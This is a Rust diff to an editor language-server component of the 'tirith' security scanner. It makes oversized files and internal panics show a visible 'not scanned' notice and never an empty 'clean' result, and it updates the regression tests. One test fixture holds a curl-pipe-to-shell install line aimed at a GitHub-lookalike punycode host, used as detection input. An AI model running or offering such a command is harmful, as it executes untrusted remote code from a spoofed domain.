@@ -76,27 +76,24 @@ impl Backend {
 
     /// Analyze `uri`'s `text` and publish (or clear) its diagnostics.
     async fn analyze_and_publish(&self, uri: Url, text: String, version: Option<i32>) {
-        // SIZE CAP: never analyze a buffer over `scan::MAX_FILE_SIZE` (10 MiB) —
+        // SIZE CAP: a buffer over `scan::MAX_FILE_SIZE` (10 MiB) is NOT scanned —
         // every rule runs over a whole-buffer copy and on this current-thread
         // runtime a huge buffer would stall diagnostics for ALL open documents.
-        // Over the cap: CLEAR this document's diagnostics and log why.
-        // (`diagnostics_for` enforces the same bound; this just surfaces it.)
+        // Log the byte detail here; the published diagnostic (from
+        // `diagnostics_for`) is a VISIBLE "not scanned" notice, never an empty
+        // set — for a security tool, "not scanned" must not render as "clean".
         if exceeds_analysis_cap(&text) {
             self.client
                 .log_message(
                     MessageType::WARNING,
                     format!(
                         "tirith: {uri} is {} bytes — over the {}-byte analysis \
-                         cap; not analyzed, diagnostics cleared for this document",
+                         cap; NOT scanned",
                         text.len(),
                         tirith_core::scan::MAX_FILE_SIZE
                     ),
                 )
                 .await;
-            self.client
-                .publish_diagnostics(uri, Vec::new(), version)
-                .await;
-            return;
         }
 
         // A non-`file:` (or unparseable) URI has no path to profile → no
@@ -106,25 +103,31 @@ impl Backend {
                 // FAIL-SAFE: `engine::analyze` is panic-capable (cf.
                 // `scan::catch_panic_scanning`), and tower-lsp has no panic
                 // isolation on this current-thread runtime — an unwind would
-                // abort the whole server. Catch it here: degrade to an empty Vec
-                // (CLEAR) and log it visibly, keeping the server running. Relies
-                // on the workspace `panic = "unwind"` profile.
+                // abort the whole server. Catch it here: log the panic detail
+                // and degrade to a VISIBLE "not scanned" notice (never a silent
+                // empty set), keeping the server running. Relies on the default
+                // unwind panic strategy (a `panic = "abort"` profile voids this).
                 match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                     diagnostics_for(&path, &text)
                 })) {
                     Ok(diags) => diags,
-                    Err(_) => {
+                    Err(panic) => {
                         self.client
                             .log_message(
                                 MessageType::ERROR,
                                 format!(
-                                    "tirith: internal error analyzing {uri}; \
-                                     diagnostics cleared for this document \
-                                     (see panic message on stderr)"
+                                    "tirith: internal error analyzing {uri}: {}; \
+                                     it was NOT scanned",
+                                    panic_message(&*panic)
                                 ),
                             )
                             .await;
-                        Vec::new()
+                        vec![notice_diagnostic(
+                            DiagnosticSeverity::WARNING,
+                            "tirith: internal error analyzing this file; it was \
+                             NOT scanned (see the tirith output log)."
+                                .to_string(),
+                        )]
                     }
                 }
             }
@@ -206,9 +209,19 @@ fn exceeds_analysis_cap(text: &str) -> bool {
 /// [`tirith_core::lsp_profiles`]; an unrecognised file type returns empty.
 pub fn diagnostics_for(path: &Path, text: &str) -> Vec<Diagnostic> {
     // SIZE CAP (defense in depth; `analyze_and_publish` also pre-checks + logs):
-    // never analyze a buffer over the cap. Keeps this pure `pub fn` safe.
+    // a buffer over the cap is NOT scanned. Return a VISIBLE "not scanned"
+    // notice rather than an empty set — for a security tool, "not scanned" must
+    // never render in an editor as "scanned, clean".
     if exceeds_analysis_cap(text) {
-        return Vec::new();
+        return vec![notice_diagnostic(
+            DiagnosticSeverity::INFORMATION,
+            format!(
+                "tirith: this file is {} bytes, over the {}-byte analysis cap, \
+                 and was NOT scanned.",
+                text.len(),
+                tirith_core::scan::MAX_FILE_SIZE
+            ),
+        )];
     }
 
     let Some(profile) = lsp_profiles::profile_for_path(path) else {
@@ -358,6 +371,43 @@ fn finding_to_diagnostic(finding: &Finding, text: &str) -> Diagnostic {
         tags: None,
         data: None,
     }
+}
+
+/// A document-level notice diagnostic (anchored at the first character) used to
+/// make a NON-RESULT visible in the editor's Problems panel — an over-cap skip
+/// or an internal analysis failure must surface as "not scanned", never render
+/// as a clean file. Carries no `code` (it is not a rule finding).
+fn notice_diagnostic(severity: DiagnosticSeverity, message: String) -> Diagnostic {
+    Diagnostic {
+        range: Range {
+            start: Position {
+                line: 0,
+                character: 0,
+            },
+            end: Position {
+                line: 0,
+                character: 0,
+            },
+        },
+        severity: Some(severity),
+        code: None,
+        code_description: None,
+        source: Some(DIAGNOSTIC_SOURCE.to_string()),
+        message,
+        related_information: None,
+        tags: None,
+        data: None,
+    }
+}
+
+/// Best-effort human string for a caught panic payload (the `&str` / `String`
+/// the panic carried), for logging at the LSP boundary.
+fn panic_message(payload: &(dyn std::any::Any + Send)) -> String {
+    payload
+        .downcast_ref::<&str>()
+        .map(|s| (*s).to_string())
+        .or_else(|| payload.downcast_ref::<String>().cloned())
+        .unwrap_or_else(|| "unknown panic".to_string())
 }
 
 /// The LSP [`Range`] for a finding: a precise span when the evidence carries a
@@ -735,10 +785,11 @@ mod tests {
         ["xn--g", "thub-3ya.com"].concat()
     }
 
-    /// F1 regression: the LSP boundary's `catch_unwind` DEGRADES a caught panic
-    /// to an empty `Vec` (clearing diagnostics) instead of aborting the server.
-    /// Proves the wrapper shape used in `analyze_and_publish`; relies on the
-    /// workspace `panic = "unwind"` profile.
+    /// F1 regression: the LSP boundary's `catch_unwind` CATCHES a panic in
+    /// analysis (degrading to a caller-chosen fallback) instead of aborting the
+    /// server. Proves the wrapper shape used in `analyze_and_publish` (which
+    /// degrades to a visible "not scanned" notice); relies on the default
+    /// unwind panic strategy (a `panic = "abort"` profile voids this).
     #[test]
     fn catch_unwind_degrades_panicking_analysis_to_empty() {
         // A synthetic stand-in for `diagnostics_for` that panics, wrapped the
@@ -864,40 +915,70 @@ mod tests {
         );
     }
 
-    /// SIZE CAP regression: a buffer over `scan::MAX_FILE_SIZE` is NOT analyzed
-    /// even when it contains a firing line. The under-cap control proves the
-    /// empty result is the cap, not a routing/analysis miss.
+    /// SIZE CAP regression: a buffer over `scan::MAX_FILE_SIZE` is NOT scanned —
+    /// it yields ONLY a visible INFORMATION "not scanned" notice (never an empty
+    /// set, which an editor renders as "scanned, clean", and never a real rule
+    /// finding). A buffer exactly AT the cap is still scanned (strict `>`), and
+    /// the under-cap control proves the notice is the cap, not a routing miss.
     #[test]
     fn oversize_buffer_is_not_analyzed() {
         let host = suspicious_host();
         let install_block = format!("```sh\ncurl http://{host}/install.sh | sh\n```\n");
 
-        // Control: the firing line in a small README DOES produce a diagnostic.
+        // Control: the firing line in a small README DOES produce a real finding.
         let small = format!("# Setup\n\n{install_block}");
         assert!(
             !exceeds_analysis_cap(&small),
             "the control buffer must be under the cap"
         );
         assert!(
-            !diagnostics_for(Path::new("README.md"), &small).is_empty(),
-            "control: a suspicious install line under the cap must produce a diagnostic"
+            diagnostics_for(Path::new("README.md"), &small)
+                .iter()
+                .any(|d| matches!(d.code, Some(NumberOrString::String(_)))),
+            "control: a suspicious install line under the cap must produce a rule finding"
         );
 
-        // A buffer one filler past the cap, still containing the firing line.
         let cap = tirith_core::scan::MAX_FILE_SIZE as usize;
-        let filler = "# padding line, not suspicious\n";
-        let mut big = String::with_capacity(cap + install_block.len() + filler.len());
-        big.push_str(&install_block);
-        while big.len() <= cap {
-            big.push_str(filler);
-        }
+
+        // Exactly AT the cap is still scanned (the predicate is strict `>`): the
+        // firing line must still yield a real rule finding. Guards a `>` → `>=`
+        // off-by-one regression.
+        let mut at_cap = install_block.clone();
+        at_cap.push_str(&"x".repeat(cap - at_cap.len()));
+        assert_eq!(at_cap.len(), cap);
+        assert!(
+            !exceeds_analysis_cap(&at_cap),
+            "a buffer exactly at the cap must NOT be over-cap"
+        );
+        assert!(
+            diagnostics_for(Path::new("README.md"), &at_cap)
+                .iter()
+                .any(|d| matches!(d.code, Some(NumberOrString::String(_)))),
+            "an at-cap buffer with a firing line must still be scanned"
+        );
+
+        // One byte past the cap: NOT scanned → exactly one INFORMATION notice
+        // with NO rule-id code (it is a notice, not a finding).
+        let big = format!("{install_block}{}", "x".repeat(cap));
         assert!(
             exceeds_analysis_cap(&big),
             "the test buffer must exceed the analysis cap"
         );
+        let over = diagnostics_for(Path::new("README.md"), &big);
+        assert_eq!(
+            over.len(),
+            1,
+            "an over-cap buffer must yield exactly the 'not scanned' notice"
+        );
+        assert_eq!(over[0].severity, Some(DiagnosticSeverity::INFORMATION));
         assert!(
-            diagnostics_for(Path::new("README.md"), &big).is_empty(),
-            "a buffer over the analysis cap must not be analyzed"
+            over[0].code.is_none(),
+            "the over-cap notice is not a rule finding (no rule-id code)"
+        );
+        assert!(
+            over[0].message.contains("NOT scanned"),
+            "the notice must say the file was NOT scanned, got: {}",
+            over[0].message
         );
     }
 
